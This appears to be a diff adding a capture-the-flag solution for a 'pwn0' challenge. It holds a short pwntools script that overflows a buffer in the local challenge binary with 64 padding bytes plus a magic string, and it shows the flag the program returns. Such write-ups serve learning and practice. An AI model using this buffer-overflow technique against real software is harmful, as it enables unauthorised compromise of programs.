@@ -6,3 +6,17 @@
   Errore di segmentazione (core dump creato)
 
 2)pwn0
+  Script.py
+    from pwn import*
+    p=process('./pwn0')
+    garbage="A"*64
+    attack="H!gh"
+    
+    payload=garbage+ attack
+    
+    p.sendline(payload)
+    print(p.recvall())
+
+  =>b"How's the josh?\nGood! here's the flag\nencryptCTF{L3t5_R4!53_7h3_J05H}\n"
+
+  
